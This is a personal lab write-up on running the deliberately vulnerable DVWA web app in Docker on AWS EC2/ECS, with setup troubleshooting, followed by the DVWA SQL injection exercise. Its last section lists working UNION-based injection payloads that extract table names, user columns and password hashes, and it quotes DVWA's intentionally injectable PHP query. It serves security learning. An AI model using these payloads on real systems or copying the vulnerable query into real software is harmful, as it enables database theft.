#  Building DVWA platform by using AWS ECS
> - start date: 2024/7/19

> [!WARNING]  
>This exercise is for learning purposes only.

## Table of Contents
1. Run Docker Container on EC2 Instance
2. Run DVWA Using Docker
3. Complete DVWA SQL Injection Lab


## 1. Run Docker Container on EC2 Instance
## build ecs
![截圖 2024-07-19 晚上10.15.08](https://hackmd.io/_uploads/r1eRgSgduA.png)

### run hello-world image
- create Dockerfile
- follow the steps in [official document](https://docs.aws.amazon.com/AmazonECS/latest/developerguide/create-container-image.html)
- check 
    ```
    [root@ip-10-0-0-52 ec2-user]# docker images                                               
    REPOSITORY                  TAG            IMAGE ID       CREATED         SIZE            
    hello-world                 latest         b85f37968aa9   5 minutes ago   270MB           
    amazon/amazon-ecs-agent     latest         23a4b504cb0c   6 days ago      87.3MB          
    ecs-service-connect-agent   interface-v1   00c4d28642d8   5 weeks ago     107MB           
    amazon/amazon-ecs-pause     0.1.0          9dd4685d3644   9 years ago     702kB  
    ```
- docker run
 ![截圖 2024-07-19 晚上10.15.57](https://hackmd.io/_uploads/HkcXHeudR.png)


#### problem: /home/ec2-user/Dockerfile: Permission denied
The difference in write permissions between /home/ec2-user and /tmp is due to the default security settings and the purpose of these directories in Unix-like systems:

- **/home/ec2-user**:
This is the home directory for the ec2-user.
By default, it's owned by the ec2-user and typically has permissions set to 700 (rwx------).
These permissions mean only the owner (ec2-user) can read, write, and execute in this directory.
When you SCP as ec2-user, you're not changing the ownership, so the strict permissions prevent writing.


- **/tmp**:
This is a temporary directory meant for all users to be able to create temporary files.
It typically has permissions set to 1777 (drwxrwxrwt).
The "t" at the end is the "sticky bit", which allows everyone to write to the directory but prevents users from deleting files they don't own.
These permissions allow any user to write to /tmp, making it accessible for operations like your SCP transfer.

![image](https://hackmd.io/_uploads/HJSg1IDOC.png)
```
[root@ip-10-0-0-52 /]# ls -l
total 12   

lrwxrwxrwx   1 root root    7 Jul  9 23:43 bin -> usr/bin             
dr-xr-xr-x   4 root root  317 Jul  9 23:43 boot                       
drwxr-xr-x  15 root root 2800 Jul 19 01:30 dev                                            
drwxr-xr-x  80 root root 8192 Jul 19 01:54 etc                                            
drwxr-xr-x   3 root root   22 Jul 12 16:40 home                                           
lrwxrwxrwx   1 root root    7 Jul  9 23:43 lib -> usr/lib                                 
lrwxrwxrwx   1 root root    9 Jul  9 23:43 lib64 -> usr/lib64                             
drwxr-xr-x   2 root root    6 Jul  9 23:43 local                                          
drwxr-xr-x   2 root root    6 Apr  9  2019 media                                          
drwxr-xr-x   3 root root   17 Jul 19 01:30 mnt                                            
drwxr-xr-x   4 root root   35 Jul 19 01:30 opt                                            
dr-xr-xr-x 104 root root    0 Jul 19 01:30 proc                                           
dr-xr-x---   4 root root  118 Jul 19 02:03 root                                           
drwxr-xr-x  26 root root  920 Jul 19 02:03 run                                            
lrwxrwxrwx   1 root root    8 Jul  9 23:43 sbin -> usr/sbin                               
drwxr-xr-x   2 root root    6 Apr  9  2019 srv                                            
dr-xr-xr-x  13 root root    0 Jul 19 01:30 sys                                            
drwxrwxrwt   8 root root  190 Jul 19 02:23 tmp                         
drwxr-xr-x  13 root root  155 Jul  9 23:43 usr               
drwxr-xr-x  18 root root  254 Jul 19 01:30 var   
```


#### problem: attach the ssm policy but still cannot use ssm for connection
```
systemctl restart amazon-ssm-agent   
```

here is the successful result

![截圖 2024-07-19 晚上10.16.28](https://hackmd.io/_uploads/SkqHrlud0.png)

## 2. Run DVWA Using Docker
- pull image from [here](https://hub.docker.com/r/vulnerables/web-dvwa).
    ```
    docker pull vulnerables/web-dvwa
    ```
- check for the version
    ```
    [root@ip-10-0-0-52 ec2-user]# docker images
    REPOSITORY                  TAG            IMAGE ID       CREATED          SIZE
    <none>                      <none>         b85f37968aa9   23 minutes ago   270MB
    amazon/amazon-ecs-agent     latest         23a4b504cb0c   6 days ago       87.3MB
    ecs-service-connect-agent   interface-v1   00c4d28642d8   5 weeks ago      107MB
    hello-world                 latest         d2c94e258dcb   14 months ago    13.3kB
    vulnerables/web-dvwa        latest         ab0d83586b6e   5 years ago      712MB
    amazon/amazon-ecs-pause     0.1.0          9dd4685d3644   9 years ago      702kB
    ```
    - latest
- run the container
    ```
    docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa
    ```
    - for typing other commands, we quit this workspace(container). This step will stop the contianer.
- restart
    - with `docker container ls -a`, we can find all the containers(including the stopped ones) ln list.
    ```
    [root@ip-10-0-0-52 ec2-user]# docker container ls -a
    CONTAINER ID   IMAGE                            COMMAND                  CREATED              STATUS                      PORTS     NAMES
    7786dc734657   amazon/amazon-ecs-agent:latest   "/agent"                 5 seconds ago        Exited (1) 5 seconds ago              ecs-agent
    c8fc1bfbc303   vulnerables/web-dvwa             "/main.sh"               About a minute ago   Exited (0) 52 seconds ago             objective_bohr
    0330626a3d3a   hello-world                      "/hello"                 14 minutes ago       Exited (0) 14 minutes ago             admiring_blackwell
    d126566354b2   b85f37968aa9                     "/bin/sh -c /root/ru…"   18 minutes ago       Up 18 minutes               80/tcp    gracious_sanderson
    ```
- restart the container
    ```
    [root@ip-10-0-0-52 ec2-user]# docker container restart c8fc1bfbc303
    c8fc1bfbc303
    ```
- check for it (can also use `docker ps`)
    ```
    [root@ip-10-0-0-52 ec2-user]# docker container ls
    CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS          PORTS     NAMES
    c8fc1bfbc303   vulnerables/web-dvwa   "/main.sh"               7 minutes ago    Up 7 seconds    80/tcp    objective_bohr
    d126566354b2   b85f37968aa9           "/bin/sh -c /root/ru…"   24 minutes ago   Up 24 minutes   80/tcp    gracious_sanderson
    ```
- get the website
    ```
    [root@ip-10-0-0-52 ec2-user]# curl -L http://localhost

    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

    <html xmlns="http://www.w3.org/1999/xhtml">

            <head>

                    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

                    <title>Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>

                    <link rel="stylesheet" type="text/css" href="dvwa/css/login.css" />

            </head>

            <body>

            <div id="wrapper">

            <div id="header">

            <br />

            <p><img src="dvwa/images/login_logo.png" /></p>

            <br />

            </div> <!--<div id="header">-->

            <div id="content">

            <form action="login.php" method="post">

            <fieldset>

                            <label for="user">Username</label> <input type="text" class="loginInput" size="20" name="username"><br />


                            <label for="pass">Password</label> <input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"><br />

                            <br />

                            <p class="submit"><input type="submit" value="Login" name="Login"></p>

            </fieldset>

            <input type='hidden' name='user_token' value='1f29c29bd7c89b432dfd71ca2059046d' />

            </form>

            <br />



            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />

            <!-- <img src="dvwa/images/RandomStorm.png" /> -->
            </div > <!--<div id="content">-->

            <div id="footer">

            <p><a href="http://www.dvwa.co.uk/" target="_blank">Damn Vulnerable Web Application (DVWA)</a></p>

            </div> <!--<div id="footer"> -->

            </div> <!--<div id="wrapper"> -->

            </body>

    </html>
    ```
    ![image](https://hackmd.io/_uploads/SJbHLDPdC.png)
    >Remember to use `http://<EC2_INSTANCE_PUBLIC_IP>` instead of `https://...` for searching, because we use 80 port.
- login
    ![image](https://hackmd.io/_uploads/SJUDVOPO0.png)
- reset
    - in the loggin page, scroll down and click for reset
    ![image](https://hackmd.io/_uploads/rJ-USuPuR.png)
- decrease the security level
    - go to the "DVWA Security" page
        ![image](https://hackmd.io/_uploads/SyhZ8OwO0.png)
    - click to submit
        ![image](https://hackmd.io/_uploads/Sk1VUdP_0.png)

 


### checking whether your docker is working
```
systemctl status docker
```
![截圖 2024-07-19 晚上10.19.03](https://hackmd.io/_uploads/HyNyUguO0.png)


### check for logs
```
[root@ip-10-0-0-52 ec2-user]# docker logs c8fc1bfbc303
```
```
[+] Starting mysql...
[ ok ] Starting MariaDB database server: mysqld.
[+] Starting apache
[....] Starting Apache httpd web server: apache2AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.17.0.3. Set the 'ServerName' directive globally to suppress this message
. ok
==> /var/log/apache2/access.log <==

==> /var/log/apache2/error.log <==
[Fri Jul 19 03:08:45.854965 2024] [mpm_prefork:notice] [pid 314] AH00163: Apache/2.4.25 (Debian) configured -- resuming normal operations
[Fri Jul 19 03:08:45.855025 2024] [core:notice] [pid 314] AH00094: Command line: '/usr/sbin/apache2'

==> /var/log/apache2/other_vhosts_access.log <==
^C[+] Starting mysql...
[ ok ] Starting MariaDB database server: mysqld.
[+] Starting apache
[....] Starting Apache httpd web server: apache2AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.17.0.3. Set the 'ServerName' directive globally to suppress this message
. ok
==> /var/log/apache2/access.log <==

==> /var/log/apache2/error.log <==
[Fri Jul 19 03:08:45.854965 2024] [mpm_prefork:notice] [pid 314] AH00163: Apache/2.4.25 (Debian) configured -- resuming normal operations
[Fri Jul 19 03:08:45.855025 2024] [core:notice] [pid 314] AH00094: Command line: '/usr/sbin/apache2'
[Fri Jul 19 03:16:35.114434 2024] [core:warn] [pid 306] AH00098: pid file /var/run/apache2/apache2.pid overwritten -- Unclean shutdown of previous Apache run?
[Fri Jul 19 03:16:35.117043 2024] [mpm_prefork:notice] [pid 306] AH00163: Apache/2.4.25 (Debian) configured -- resuming normal operations
[Fri Jul 19 03:16:35.117060 2024] [core:notice] [pid 306] AH00094: Command line: '/usr/sbin/apache2'

==> /var/log/apache2/other_vhosts_access.log <==
```
From the logs ahead, it appears that the container is running and both MySQL and Apache are starting up successfully.

![截圖 2024-07-19 晚上10.19.26](https://hackmd.io/_uploads/H1heIg_dR.png)
### get into the container
```bash=
docker exec -it <CONTAINER_ID> /bin/bash
```
ex
```bash=
docker exec -it c8fc1bfbc303 /bin/bash
```

### problem: no port binding, "curl: (7) Failed to connect to localhost port 80 after 0 ms: Couldn't connect to server"
If you do `curl localhost` and "get curl: (7) Failed to connect to localhost port 80 after 0 ms: Couldn't connect to server," you can solve it by doing the following part.


This problem might due to the missing port. It usually happens when you forget to target specific port like using command `docker run -it <IMAGE_NAME>`. There are two ways for checking:

```
[root@ip-10-0-0-52 ec2-user]# docker inspect c8fc1bfbc303 | grep 
PortBindings -A 10
            "PortBindings": {},
            "RestartPolicy": {
                "Name": "no",
                "MaximumRetryCount": 0
            },
            "AutoRemove": false,
            "VolumeDriver": "",
            "VolumesFrom": null,
            "ConsoleSize": [
                33,
                147
```

```
[root@ip-10-0-0-52 ec2-user]# docker port <CONTAINER_ID>
```
 To solve this problem, we have to build a new container.
 ```bash=
docker stop <CONTAINER_ID>
docker rm <CONTAINER_ID>
```
```bash=
# rebuild
docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa
```
After doing these steps, the problem has solved.

## 3. Complete DVWA SQL Injection Lab
- payload
    ```sql
    ' OR '1
    ```
- result 
    ![image](https://hackmd.io/_uploads/BkaetOvuA.png)

- We can know that the type in database is string.
    - if I type int
        - ![image](https://hackmd.io/_uploads/BJJf_FwuA.png)
        - ![image](https://hackmd.io/_uploads/HJuf_KvdA.png)
    - if I type string
        - ![image](https://hackmd.io/_uploads/rJG9PYw_A.png)
        - ![image](https://hackmd.io/_uploads/H1ziwKwdC.png)
- finding the maximum number of columns
    - not over situation
    ![image](https://hackmd.io/_uploads/Sy8rl3wOR.png)
    - over situation
    ![image](https://hackmd.io/_uploads/HyKVlhwd0.png)
- payload for getting database's name
    ```sql=
    1' UNION SELECT DATABASE(), NULL #
    ```
    ![image](https://hackmd.io/_uploads/BJp3enwuR.png)
- payload for getting table's name
    ```sql=
     1' UNION SELECT TABLE_NAME, NULL FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dvwa' #
    ```
    ![image](https://hackmd.io/_uploads/HJPJfnvuR.png)
- payload for getting all columns in "users" table(to find more personal information)
    ```sql=
    1' UNION SELECT COLUMN_NAME, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='dvwa' AND TABLE_NAME='users' #
    ```
    ![image](https://hackmd.io/_uploads/ByXIM2v_C.png)
- payload for getting all columns in the other one
    ```sql=
    1' UNION SELECT COLUMN_NAME, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='dvwa' AND TABLE_NAME='guestbook' #
    ```
    ![image](https://hackmd.io/_uploads/ry7ymhwOA.png)
- payload for getting password that was hashed
    ```sql=
    1' UNION SELECT password, NULL FROM dvwa.users #
    ```
    ![image](https://hackmd.io/_uploads/SJWP43PO0.png)

The source code for this webpage.
```php=
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```
